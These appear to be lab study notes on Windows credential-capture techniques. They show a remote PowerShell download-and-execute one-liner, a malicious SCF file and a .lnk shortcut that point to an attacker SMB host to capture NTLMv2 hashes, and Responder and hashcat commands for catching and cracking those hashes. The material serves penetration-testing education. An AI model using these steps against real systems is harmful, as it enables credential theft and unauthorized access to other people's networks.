## Traffic Capture

![](Interacting%20with%20Users-20260824-134047.png)
![](Interacting%20with%20Users-20260824-134101.png)
The tool [net-creds](https://github.com/DanMcInerney/net-creds) can be run from our attack box to sniff passwords and hashes from a live interface or a pcap file.
## Process Command Lines
#### Monitoring for Process Command Lines

```shell
while($true)
{

  $process = Get-WmiObject Win32_Process | Select-Object CommandLine
  Start-Sleep 1
  $process2 = Get-WmiObject Win32_Process | Select-Object CommandLine
  Compare-Object -ReferenceObject $process -DifferenceObject $process2

}
```
#### Running Monitor Script on Target Host

```powershell
PS C:\htb> IEX (iwr 'http://10.10.10.205/procmon.ps1')
```
## SCF on a File Share

If we change the IconFile to an SMB server that we control and run a tool such as [Responder](https://github.com/lgandx/Responder), [Inveigh](https://github.com/Kevin-Robertson/Inveigh), or [InveighZero](https://github.com/Kevin-Robertson/InveighZero), we can often capture NTLMv2 password hashes for any users who browse the share. This can be particularly useful if we gain write access to a file share that looks to be heavily used or even a directory on a user's workstation.
#### Malicious SCF File

```shell
[Shell]
Command=2
IconFile=\\10.10.14.3\share\legit.ico
[Taskbar]
Command=ToggleDesktop
```
#### Starting Responder

```shell
3kjS@htb[/htb]$ sudo responder -w -v -I tun0
```
![](Screenshot%202026-08-24%20at%2013.44.55.png)
![](Screenshot%202026-08-24%20at%2013.44.40.png)
#### Cracking NTLMv2 Hash with Hashcat

```shell
3kjS@htb[/htb]$ hashcat -m 5600 hash /usr/share/wordlists/rockyou.txt
```
## Capturing Hashes with a Malicious .lnk File

We can use various tools to generate a malicious .lnk file, such as [Lnkbomb](https://github.com/dievus/lnkbomb), as it is not as straightforward as creating a malicious .scf file.
#### Generating a Malicious .lnk File

```powershell
$objShell = New-Object -ComObject WScript.Shell
$lnk = $objShell.CreateShortcut("C:\legit.lnk")
$lnk.TargetPath = "\\<attackerIP>\@pwn.png"
$lnk.WindowStyle = 1
$lnk.IconLocation = "%windir%\system32\shell32.dll, 3"
$lnk.Description = "Browsing to the directory where this file is saved will trigger an auth request."
$lnk.HotKey = "Ctrl+Alt+O"
$lnk.Save()
```
